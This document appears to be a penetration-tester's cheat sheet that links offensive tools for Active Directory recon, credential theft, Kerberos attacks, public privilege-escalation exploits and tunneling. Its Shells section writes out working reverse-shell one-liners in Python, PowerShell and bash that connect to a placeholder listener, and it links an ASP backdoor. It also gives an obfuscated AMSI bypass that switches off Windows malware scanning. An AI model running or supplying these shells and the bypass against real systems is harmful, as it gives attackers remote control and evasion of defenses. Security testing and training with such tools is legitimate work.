# Tools Of The Trade
A collection of tools for CTFs, Forensics, or Engagements.

### Recon
```
https://github.com/EnableSecurity/wafw00f
https://github.com/cytopia/smtp-user-enum
https://github.com/0xZDH/o365spray
https://github.com/dafthack/MailSniper
https://github.com/ustayready/CredKing
```
```
https://github.com/SecureAuthCorp/impacket/blob/master/examples/samrdump.py
https://github.com/ropnop/kerbrute
https://github.com/SnaffCon/Snaffler
https://github.com/AlessandroZ/LaZagne
https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1
https://github.com/clr2of8/DPAT
https://github.com/Arvanaghi/SessionGopher
https://github.com/gdedrouas/Exchange-AD-Privesc
https://msrc.microsoft.com/update-guide/vulnerability

```
```
https://github.com/adrecon/ADRecon
https://github.com/Kevin-Robertson/Powermad
https://github.com/PowerShellMafia/PowerSploit
https://github.com/dmchell/SharpView
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
https://github.com/fox-it/BloodHound.py
https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1
https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py
https://github.com/leoloobeek/LAPSToolkit
https://github.com/ropnop/windapsearch
https://github.com/byt3bl33d3r/pth-toolkit
https://github.com/rvazarkar/GMSAPasswordReader
https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
https://github.com/DominicBreuker/pspy
https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
```

### Exploitation
```
https://raw.githubusercontent.com/ShutdownRepo/impacket/dacledit/examples/dacledit.py
https://github.com/ShutdownRepo/pywhisker.git
https://github.com/ShutdownRepo/targetedKerberoast
https://github.com/dirkjanm/PKINITtools
https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py
https://github.com/topotam/PetitPotam
https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1
https://github.com/decoder-it/psgetsystem
```
#### Netfilter
```
https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555
https://github.com/pqlx/CVE-2022-1015
https://github.com/Liuk3r/CVE-2023-32233
```


### Shells
```
# Asp Backdoor
https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/asp/newaspcmd.asp

# Netcat executable
https://github.com/int0x33/nc.exe/raw/master/nc.exe

# Python Revshell One-Liner
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LISTENER_IP>",<LISTENER_PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

# Powershell Revshell One-liner
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LISTENER_IP>',<LISTENER_PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Linux Revshell One-liners
bash -c 'bash -i >& /dev/tcp/<LISTENER_IP>/<LISTENER_PORT> 0>&1'

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LISTENER_IP> <LISTENER_PORT> >/tmp/f

# Shell Stabilization
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;
stty raw -echo; fg; 
ls; 
export SHELL=/bin/bash; 
export TERM=screen; 
stty rows 38 columns 116; 
reset;

# AMSI Bypass
[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,!$false)
```

### Tunneling
```
https://github.com/nccgroup/SocksOverRDP
https://www.proxifier.com/download/ProxifierPE.zip
https://github.com/jpillora/chisel/releases
https://github.com/klsecservices/rpivot.git
https://github.com/lukebaggett/dnscat2-powershell.git
https://github.com/iagox86/dnscat2.git
https://github.com/utoni/ptunnel-ng.git
```

### Misc
```
https://github.com/Flangvik/SharpCollection
https://10minutemail.com/
https://lolbas-project.github.io/
https://github.com/FortyNorthSecurity/EyeWitness
https://www.pingcastle.com/
https://github.com/rasta-mouse/ThreatCheck
https://mxtoolbox.com/
```
